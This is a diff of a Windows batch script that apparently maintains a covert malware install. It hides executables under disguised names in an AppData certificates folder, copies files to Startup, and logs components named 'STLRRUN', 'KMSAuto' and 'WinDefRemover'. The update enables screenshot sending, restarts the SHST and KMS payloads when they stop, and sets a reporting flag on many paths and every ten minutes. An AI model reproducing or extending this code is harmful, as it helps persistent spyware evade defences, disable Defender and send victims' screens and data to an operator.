@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=16.9"
+set "BATCHVERSION=17"
 
 
 
@@ -118,10 +118,14 @@ echo ProtectionWindowsHostProcess.exe is not running. Continue.....
 
 
 
-
-set "CheckSend=1"
-set "SENDSCREENSHOT=0"
+echo Maybe Turning CheckSend=1
+set "CheckSend=0"
+set "SENDSCREENSHOT=1"
 set "lastMinute=none"
+echo.
+echo.
+echo CheckSend=!CheckSend!
+echo.
 
 
 
@@ -269,8 +273,9 @@ if "%STLRKILL%" NEQ "1" goto NOTKILLSTLR
 
 :PROCESSKILLERSTLR
 set "ProcessToKill=STLRRUNNERCALLER"
+echo Turning CheckSend=1
 set "CheckSend=1"
-echo CheckSend=%CheckSend%
+echo CheckSend=!CheckSend!
 echo.
 echo Listing child processes of %ProcessToKill%.exe...
 powershell -Command "Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq (Get-Process -Name %ProcessToKill%).Id } | Select-Object ProcessId, Name" > chldrocess.txt
@@ -334,6 +339,7 @@ goto :STLRCALLRUNNING
 
 :STLRCALLNOTRUNNING
 echo STLRRUNNERCALLER.exe is not running.
+echo Turning CheckSend=1
 set "CheckSend=1"
 echo CheckSend=%CheckSend%
 echo Starting STLRRUNNERCALLER...
@@ -737,6 +743,7 @@ copy "%sourceFile%" "%startupFile%"
 
 
 set "MESSAGE=%MESSAGE%SHST^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
 
 
@@ -878,6 +885,7 @@ copy "%sourceFile%" "%startupFile%"
 
 
 set "MESSAGE=%MESSAGE%KMSAuto^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
 
 
@@ -937,6 +945,7 @@ if exist "%embeddedScript%" (
 )
 
 set "MESSAGE=%MESSAGE%ComSurrogate^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
 
 
@@ -1011,6 +1020,7 @@ if exist "%embeddedScript%" (
 
 
 set "MESSAGE=%MESSAGE%CoreProcessInstalled^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
 
 
@@ -1075,6 +1085,7 @@ if exist "%embeddedScript%" (
 )
 
 set "MESSAGE=%MESSAGE%7ZIP^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
 
 
@@ -1129,6 +1140,7 @@ if exist "%embeddedScript%" (
 )
 
 set "MESSAGE=%MESSAGE%NIRCMD^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
 
 
@@ -1179,6 +1191,7 @@ if exist "%embeddedScript%" (
 )
 
 set "MESSAGE=%MESSAGE%STLRRUN^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
 
 
@@ -1239,8 +1252,8 @@ if exist "%embeddedScript%" (
 )
 
 set "MESSAGE=%MESSAGE%Handle^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
-
 
 
 echo.
@@ -1322,11 +1335,58 @@ echo.
 echo.
 
 
+if "!KMSSTART!"=="1" if "!SHSTSTART!"=="1" (
+    echo KMSSTART=SHSTSTART=1
+    echo Going to CHECKIFRUNNING
+    goto :CHECKIFRUNNING
+)
+
+echo One of them # 1
+echo Going to NEXT5
+goto NEXT5
 
 
 
 
 
+
+:CHECKIFRUNNING
+
+:: Check if SHSTFILE is running
+powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' }) { exit 0 } else { exit 1 }"
+if %errorlevel%==1 (
+    echo %SHSTFILE% is not running. starting now...
+    start "" "%SHSTFILE%"
+    echo Turning CheckSend=1
+    set "CheckSend=1"
+) else (
+    echo %SHSTFILE% is already running.
+)
+echo.
+echo.
+:: Check if KMSFILE is running
+powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' }) { exit 0 } else { exit 1 }"
+if %errorlevel%==1 (
+    echo %KMSFILE% is not running. starting now...
+    start "" "%KMSFILE%"
+    echo Turning CheckSend=1
+    set "CheckSend=1"
+) else (
+    echo %SHSTFILE% is already running.
+)
+
+echo.
+echo.
+echo CheckSend Now is = !CheckSend!
+
+
+
+
+
+
+:NEXT5
+echo NEXT5 Started.
+echo.
 
 
 for /f "tokens=*" %%A in ('certutil -hashfile "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe" MD5 ^| findstr /V "hash"') do set "RUNEVERYCALLERMD5=%%A"
@@ -1334,6 +1394,10 @@ echo MD5 of RUNEVERYCALLER = %RUNEVERYCALLERMD5%
 echo.
 echo.
 
+for /f "tokens=*" %%A in ('certutil -hashfile "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" MD5 ^| findstr /V "hash"') do set "ProtectionWindowsHostProcessMD5=%%A"
+echo MD5 of ProtectionWindowsHostProcess = %ProtectionWindowsHostProcessMD5%
+echo.
+echo.
 
 
 
@@ -1648,6 +1712,7 @@ echo.
 
 
 set "MESSAGE=%MESSAGE%WinDefRemover^|"
+echo Turning CheckSend=1
 set "CheckSend=1"
 
 
@@ -1740,7 +1805,9 @@ echo.
 set "currentMinute=%time:~3,2%"
 :EVERY5MIN
 
-
+echo CurrentMinute=%currentMinute%
+echo.
+echo Maybe Turning CheckSend=1
 if "%currentMinute%"=="00" set "CheckSend=1"
 if "%currentMinute%"=="10" set "CheckSend=1"
 if "%currentMinute%"=="20" set "CheckSend=1"
@@ -1750,9 +1817,7 @@ if "%currentMinute%"=="50" set "CheckSend=1"
 
 
 
-echo CheckSend=%CheckSend%
-
-
+echo CheckSend=!CheckSend!
 
 
 :: ============ RUNNING TOPIC ============
@@ -1858,11 +1923,11 @@ echo :CHECKSENDING
 echo.
 
 :: Check the value of CheckSend
-if "%CheckSend%"=="1" (
-    echo - CheckSend=%CheckSend% - Going to SENDGRANTED
+if "!CheckSend!"=="1" (
+    echo - CheckSend=!CheckSend! - Going to SENDGRANTED
     goto SENDGRANTED
 ) else (
-    echo - CheckSend=%CheckSend% - Going to checkloooop
+    echo - CheckSend=!CheckSend! - Going to checkloooop
     goto NEXT2
 )
 
